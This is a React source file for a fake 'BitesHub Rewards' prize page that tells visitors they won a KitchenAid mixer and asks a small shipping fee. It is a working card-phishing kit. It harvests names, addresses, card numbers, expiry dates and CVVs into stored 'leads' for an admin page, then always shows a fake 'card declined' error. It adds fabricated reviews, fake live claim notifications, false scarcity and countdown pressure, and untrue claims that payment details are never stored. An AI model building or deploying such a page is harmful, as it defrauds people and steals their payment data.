/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Routes, Route, Link } from 'react-router-dom';
import Admin from './Admin.tsx';
import { 
  ShieldCheck, 
  Truck, 
  Clock, 
  CheckCircle2, 
  ChevronRight, 
  Lock, 
  Star,
  Package,
  CreditCard,
  MapPin,
  User,
  AlertCircle
} from 'lucide-react';

function LandingPage() {
  const [step, setStep] = useState(1);
  const [timeLeft, setTimeLeft] = useState(299); // 5 minutes
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    address: '',
    city: '',
    zip: '',
    email: '',
    phone: '',
    cardNumber: '',
    expiry: '',
    cvv: ''
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const [notification, setNotification] = useState<{name: string, city: string} | null>(null);

  useEffect(() => {
    const names = ["James", "Emma", "Liam", "Olivia", "Noah", "Ava"];
    const cities = ["Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego"];
    
    const interval = setInterval(() => {
      const randomName = names[Math.floor(Math.random() * names.length)];
      const randomCity = cities[Math.floor(Math.random() * cities.length)];
      setNotification({ name: randomName, city: randomCity });
      
      setTimeout(() => setNotification(null), 5000);
    }, 15000);

    return () => clearInterval(interval);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleNext = () => {
    if (step < 3) setStep(step + 1);
  };

  const handleSubmit = () => {
    setIsSubmitting(true);
    setError(null);
    
    // Save to localStorage for admin panel
    const leads = JSON.parse(localStorage.getItem('biteshub_leads') || '[]');
    const newLead = {
      ...formData,
      id: Math.random().toString(36).substr(2, 9),
      timestamp: new Date().toISOString()
    };
    localStorage.setItem('biteshub_leads', JSON.stringify([newLead, ...leads]));

    // Simulate transaction failure after delay
    setTimeout(() => {
      setIsSubmitting(false);
      setError("Transaction Failed: Your card was declined. Please try another payment method or contact your bank.");
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-slate-50 font-sans text-slate-900 selection:bg-blue-100">
      {/* Top Banner */}
      <div className="bg-blue-600 text-white py-2 px-4 text-center text-sm font-medium flex items-center justify-center gap-2">
        <Clock className="w-4 h-4" />
        <span>Limited Time Offer: Your reservation expires in {formatTime(timeLeft)}</span>
      </div>

      {/* Header */}
      <header className="bg-white border-bottom border-slate-200 py-4 px-6 sticky top-0 z-50 shadow-sm">
        <div className="max-w-5xl mx-auto flex justify-between items-center">
          <div className="flex items-center gap-2">
            <div className="bg-blue-600 p-1.5 rounded-lg">
              <Package className="w-6 h-6 text-white" />
            </div>
            <span className="text-xl font-bold tracking-tight text-slate-800">BitesHub<span className="text-blue-600">Rewards</span></span>
          </div>
          <div className="hidden md:flex items-center gap-6 text-sm font-medium text-slate-500">
            <div className="flex items-center gap-1.5">
              <ShieldCheck className="w-4 h-4 text-green-500" />
              <span>Verified Winner</span>
            </div>
            <div className="flex items-center gap-1.5">
              <Lock className="w-4 h-4 text-slate-400" />
              <span>Secure Connection</span>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-5xl mx-auto px-4 py-8 md:py-12 grid grid-cols-1 lg:grid-cols-12 gap-8">
        {/* Left Column: Product Info */}
        <div className="lg:col-span-7 space-y-8">
          <motion.div 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-4"
          >
            <div className="inline-flex items-center gap-2 px-3 py-1 bg-blue-50 text-blue-700 rounded-full text-xs font-bold uppercase tracking-wider">
              <Star className="w-3 h-3 fill-current" />
              Today's Exclusive Reward
            </div>
            <h1 className="text-4xl md:text-5xl font-extrabold tracking-tight text-slate-900 leading-tight">
              Congratulations! <br />
              <span className="text-blue-600">You're Today's Winner</span>
            </h1>
            <p className="text-lg text-slate-600 max-w-xl">
              As part of our 2026 Loyalty Program, you have been selected to receive a brand new 
              <span className="font-bold text-slate-900"> KitchenAid® Artisan® Series Stand Mixer</span>. 
              Just cover the small shipping fee to claim your prize.
            </p>
          </motion.div>

          <motion.div 
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ delay: 0.2 }}
            className="relative bg-white rounded-3xl p-8 shadow-xl shadow-slate-200/50 border border-slate-100 overflow-hidden group"
          >
            <div className="absolute top-0 right-0 bg-blue-600 text-white px-6 py-2 rounded-bl-2xl font-bold text-sm z-10">
              MSRP: $429.99 → $0.00
            </div>
            <img 
              src="https://picsum.photos/seed/mixer/800/600" 
              alt="KitchenAid Stand Mixer" 
              className="w-full h-auto rounded-2xl transition-transform duration-500 group-hover:scale-105"
              referrerPolicy="no-referrer"
            />
            <div className="mt-6 flex flex-wrap gap-4">
              <div className="flex items-center gap-2 bg-slate-50 px-4 py-2 rounded-xl border border-slate-100">
                <CheckCircle2 className="w-5 h-5 text-green-500" />
                <span className="text-sm font-semibold">In Stock</span>
              </div>
              <div className="flex items-center gap-2 bg-slate-50 px-4 py-2 rounded-xl border border-slate-100">
                <Truck className="w-5 h-5 text-blue-500" />
                <span className="text-sm font-semibold">Express Shipping</span>
              </div>
            </div>

            {/* Stock Level Indicator */}
            <div className="mt-8 space-y-2">
              <div className="flex justify-between text-xs font-bold uppercase tracking-wider text-slate-500">
                <span>Stock Level</span>
                <span className="text-red-600">Only 7 units left</span>
              </div>
              <div className="w-full bg-slate-100 h-2 rounded-full overflow-hidden">
                <motion.div 
                  className="h-full bg-red-500"
                  initial={{ width: "100%" }}
                  animate={{ width: "12%" }}
                  transition={{ duration: 2, delay: 1 }}
                />
              </div>
            </div>
          </motion.div>

          {/* Reviews/Trust Section */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {[
              { name: "Sarah J.", text: "Received mine in 3 days! Can't believe it's actually real. Best stand mixer ever.", rating: 5 },
              { name: "Michael R.", text: "The shipping was fast and the product is genuine. Highly recommend BitesHub.", rating: 5 }
            ].map((review, i) => (
              <div key={i} className="bg-white p-6 rounded-2xl border border-slate-100 shadow-sm">
                <div className="flex gap-1 mb-2">
                  {[...Array(review.rating)].map((_, j) => (
                    <Star key={j} className="w-3 h-3 text-yellow-400 fill-current" />
                  ))}
                </div>
                <p className="text-sm text-slate-600 italic mb-3">"{review.text}"</p>
                <p className="text-xs font-bold text-slate-900">— {review.name}</p>
              </div>
            ))}
          </div>
        </div>

        {/* Right Column: Form */}
        <div className="lg:col-span-5">
          <div className="sticky top-24">
            <motion.div 
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              className="bg-white rounded-3xl shadow-2xl shadow-blue-900/10 border border-slate-100 overflow-hidden"
            >
              {/* Form Header */}
              <div className="bg-slate-900 p-6 text-white">
                <div className="flex justify-between items-center mb-4">
                  <h2 className="text-xl font-bold">Claim Your Prize</h2>
                  <span className="text-xs bg-blue-600 px-2 py-1 rounded font-bold uppercase tracking-widest">Step {step} of 3</span>
                </div>
                <div className="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
                  <motion.div 
                    className="h-full bg-blue-500"
                    initial={{ width: "33%" }}
                    animate={{ width: `${(step / 3) * 100}%` }}
                  />
                </div>
              </div>

              <div className="p-8">
                <AnimatePresence mode="wait">
                  {step === 1 && (
                    <motion.div 
                      key="step1"
                      initial={{ opacity: 0, x: 10 }}
                      animate={{ opacity: 1, x: 0 }}
                      exit={{ opacity: 0, x: -10 }}
                      className="space-y-6"
                    >
                      <div className="flex items-center gap-3 mb-6">
                        <div className="bg-blue-100 p-2 rounded-full">
                          <User className="w-5 h-5 text-blue-600" />
                        </div>
                        <div>
                          <h3 className="font-bold text-slate-900">Personal Information</h3>
                          <p className="text-xs text-slate-500">Tell us who to send the prize to</p>
                        </div>
                      </div>
                      
                      <div className="grid grid-cols-2 gap-4">
                        <div className="space-y-1.5">
                          <label className="text-xs font-bold text-slate-500 uppercase">First Name</label>
                          <input 
                            type="text" 
                            placeholder="John"
                            className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all outline-none"
                            value={formData.firstName}
                            onChange={(e) => setFormData({...formData, firstName: e.target.value})}
                          />
                        </div>
                        <div className="space-y-1.5">
                          <label className="text-xs font-bold text-slate-500 uppercase">Last Name</label>
                          <input 
                            type="text" 
                            placeholder="Doe"
                            className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all outline-none"
                            value={formData.lastName}
                            onChange={(e) => setFormData({...formData, lastName: e.target.value})}
                          />
                        </div>
                      </div>

                      <div className="space-y-1.5">
                        <label className="text-xs font-bold text-slate-500 uppercase">Email Address</label>
                        <input 
                          type="email" 
                          placeholder="john@example.com"
                          className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all outline-none"
                          value={formData.email}
                          onChange={(e) => setFormData({...formData, email: e.target.value})}
                        />
                      </div>

                      <button 
                        onClick={handleNext}
                        className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-2xl shadow-lg shadow-blue-200 transition-all flex items-center justify-center gap-2 group"
                      >
                        Continue to Shipping
                        <ChevronRight className="w-5 h-5 transition-transform group-hover:translate-x-1" />
                      </button>
                    </motion.div>
                  )}

                  {step === 2 && (
                    <motion.div 
                      key="step2"
                      initial={{ opacity: 0, x: 10 }}
                      animate={{ opacity: 1, x: 0 }}
                      exit={{ opacity: 0, x: -10 }}
                      className="space-y-6"
                    >
                      <div className="flex items-center gap-3 mb-6">
                        <div className="bg-blue-100 p-2 rounded-full">
                          <MapPin className="w-5 h-5 text-blue-600" />
                        </div>
                        <div>
                          <h3 className="font-bold text-slate-900">Shipping Address</h3>
                          <p className="text-xs text-slate-500">Where should we deliver your KitchenAid?</p>
                        </div>
                      </div>

                      <div className="space-y-1.5">
                        <label className="text-xs font-bold text-slate-500 uppercase">Street Address</label>
                        <input 
                          type="text" 
                          placeholder="123 Main St"
                          className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all outline-none"
                          value={formData.address}
                          onChange={(e) => setFormData({...formData, address: e.target.value})}
                        />
                      </div>

                      <div className="grid grid-cols-2 gap-4">
                        <div className="space-y-1.5">
                          <label className="text-xs font-bold text-slate-500 uppercase">City</label>
                          <input 
                            type="text" 
                            placeholder="New York"
                            className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all outline-none"
                            value={formData.city}
                            onChange={(e) => setFormData({...formData, city: e.target.value})}
                          />
                        </div>
                        <div className="space-y-1.5">
                          <label className="text-xs font-bold text-slate-500 uppercase">ZIP Code</label>
                          <input 
                            type="text" 
                            placeholder="10001"
                            className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all outline-none"
                            value={formData.zip}
                            onChange={(e) => setFormData({...formData, zip: e.target.value})}
                          />
                        </div>
                      </div>

                      <button 
                        onClick={handleNext}
                        className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-2xl shadow-lg shadow-blue-200 transition-all flex items-center justify-center gap-2 group"
                      >
                        Continue to Payment
                        <ChevronRight className="w-5 h-5 transition-transform group-hover:translate-x-1" />
                      </button>
                    </motion.div>
                  )}

                  {step === 3 && (
                    <motion.div 
                      key="step3"
                      initial={{ opacity: 0, x: 10 }}
                      animate={{ opacity: 1, x: 0 }}
                      exit={{ opacity: 0, x: -10 }}
                      className="space-y-6"
                    >
                      <div className="flex items-center gap-3 mb-6">
                        <div className="bg-blue-100 p-2 rounded-full">
                          <CreditCard className="w-5 h-5 text-blue-600" />
                        </div>
                        <div>
                          <h3 className="font-bold text-slate-900">Final Step</h3>
                          <p className="text-xs text-slate-500">Secure shipping fee payment</p>
                        </div>
                      </div>

                      <div className="bg-slate-50 p-4 rounded-2xl border border-slate-200 space-y-3">
                        <div className="flex justify-between text-sm">
                          <span className="text-slate-500">KitchenAid® Stand Mixer</span>
                          <span className="font-bold text-green-600">FREE</span>
                        </div>
                        <div className="flex justify-between text-sm">
                          <span className="text-slate-500">Express Shipping</span>
                          <span className="font-bold">$4.95</span>
                        </div>
                        <div className="pt-3 border-top border-slate-200 flex justify-between items-center">
                          <span className="font-bold text-slate-900">Total Due</span>
                          <span className="text-xl font-extrabold text-blue-600">$4.95</span>
                        </div>
                      </div>

                      <div className="space-y-4">
                        <div className="space-y-1.5">
                          <label className="text-xs font-bold text-slate-500 uppercase">Card Number</label>
                          <div className="relative">
                            <input 
                              type="text" 
                              placeholder="0000 0000 0000 0000"
                              maxLength={19}
                              className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all outline-none"
                              value={formData.cardNumber}
                              onChange={(e) => {
                                let value = e.target.value.replace(/\D/g, '');
                                value = value.match(/.{1,4}/g)?.join(' ') || value;
                                setFormData({...formData, cardNumber: value.slice(0, 19)});
                              }}
                            />
                            <CreditCard className="w-5 h-5 text-slate-300 absolute right-4 top-1/2 -translate-y-1/2" />
                          </div>
                        </div>
                        <div className="grid grid-cols-2 gap-4">
                          <div className="space-y-1.5">
                            <label className="text-xs font-bold text-slate-500 uppercase">Expiry Date</label>
                            <input 
                              type="text" 
                              placeholder="MM/YY"
                              maxLength={5}
                              className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all outline-none"
                              value={formData.expiry}
                              onChange={(e) => {
                                let value = e.target.value.replace(/\D/g, '');
                                if (value.length > 2) {
                                  value = value.slice(0, 2) + '/' + value.slice(2, 4);
                                }
                                setFormData({...formData, expiry: value});
                              }}
                            />
                          </div>
                          <div className="space-y-1.5">
                            <label className="text-xs font-bold text-slate-500 uppercase">CVV</label>
                            <input 
                              type="text" 
                              placeholder="123"
                              maxLength={3}
                              className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all outline-none"
                              value={formData.cvv}
                              onChange={(e) => setFormData({...formData, cvv: e.target.value.replace(/\D/g, '').slice(0, 3)})}
                            />
                          </div>
                        </div>
                      </div>

                      <AnimatePresence>
                        {error && (
                          <motion.div 
                            initial={{ opacity: 0, height: 0 }}
                            animate={{ opacity: 1, height: 'auto' }}
                            exit={{ opacity: 0, height: 0 }}
                            className="p-4 bg-red-50 rounded-xl border border-red-100 flex gap-3"
                          >
                            <AlertCircle className="w-5 h-5 text-red-600 shrink-0" />
                            <p className="text-xs text-red-800 leading-relaxed font-bold">
                              {error}
                            </p>
                          </motion.div>
                        )}
                      </AnimatePresence>

                      <div className="p-4 bg-blue-50 rounded-xl border border-blue-100 flex gap-3">
                        <ShieldCheck className="w-5 h-5 text-blue-600 shrink-0" />
                        <p className="text-xs text-blue-800 leading-relaxed">
                          Your information is protected by 256-bit SSL encryption. We never store your full payment details.
                        </p>
                      </div>

                      <button 
                        onClick={handleSubmit}
                        disabled={isSubmitting}
                        className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-4 rounded-2xl shadow-lg shadow-green-200 transition-all flex items-center justify-center gap-2 group disabled:opacity-50 disabled:cursor-not-allowed"
                      >
                        {isSubmitting ? 'Processing...' : 'Complete Order'}
                        {!isSubmitting && <ChevronRight className="w-5 h-5 transition-transform group-hover:translate-x-1" />}
                      </button>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>

              {/* Trust Footer */}
              <div className="p-6 bg-slate-50 border-top border-slate-100 flex justify-center gap-8 opacity-50 grayscale hover:grayscale-0 transition-all duration-500">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa" className="h-4" referrerPolicy="no-referrer" />
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard" className="h-4" referrerPolicy="no-referrer" />
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" className="h-4" referrerPolicy="no-referrer" />
              </div>
            </motion.div>

            {/* Urgency Badge */}
            <div className="mt-6 flex items-center justify-center gap-2 text-sm font-medium text-slate-500">
              <div className="flex -space-x-2">
                {[1, 2, 3].map((i) => (
                  <img 
                    key={i}
                    src={`https://i.pravatar.cc/100?img=${i + 10}`} 
                    alt="User" 
                    className="w-6 h-6 rounded-full border-2 border-white"
                    referrerPolicy="no-referrer"
                  />
                ))}
              </div>
              <span>+142 others are claiming this right now</span>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-white border-top border-slate-200 mt-20 py-12 px-6">
        <div className="max-w-5xl mx-auto text-center space-y-6">
          <div className="flex justify-center gap-2 opacity-50">
            <Package className="w-6 h-6" />
            <span className="text-lg font-bold tracking-tight">BitesHub</span>
          </div>
          <p className="text-xs text-slate-400 max-w-2xl mx-auto leading-relaxed">
            © 2026 BitesHub Rewards. All rights reserved. This sweepstakes is not affiliated with or endorsed by KitchenAid. 
            Participants must be 18+ and residents of the United States. Terms and conditions apply. 
            Customer Service: 1-877-646-2263
          </p>
          <div className="flex justify-center gap-6 text-xs font-bold text-slate-500 uppercase tracking-widest">
            <a href="#" className="hover:text-blue-600 transition-colors">Terms</a>
            <a href="#" className="hover:text-blue-600 transition-colors">Privacy</a>
            <a href="#" className="hover:text-blue-600 transition-colors">Contact</a>
            <Link to="/admin" className="hover:text-blue-600 transition-colors">Admin</Link>
          </div>
        </div>
      </footer>

      {/* Social Proof Notification */}
      <AnimatePresence>
        {notification && (
          <motion.div 
            initial={{ opacity: 0, x: -100 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: -100 }}
            className="fixed bottom-6 left-6 z-[100] bg-white rounded-2xl shadow-2xl border border-slate-100 p-4 flex items-center gap-4 max-w-sm"
          >
            <div className="bg-green-100 p-2 rounded-full">
              <CheckCircle2 className="w-5 h-5 text-green-600" />
            </div>
            <div>
              <p className="text-sm font-bold text-slate-900">{notification.name} from {notification.city}</p>
              <p className="text-xs text-slate-500">Just claimed their KitchenAid® Stand Mixer</p>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

export default function App() {
  return (
    <Routes>
      <Route path="/" element={<LandingPage />} />
      <Route path="/admin" element={<Admin />} />
    </Routes>
  );
}
